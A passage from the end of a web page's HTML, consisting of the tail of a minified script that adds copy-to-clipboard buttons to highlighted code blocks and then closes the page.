o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>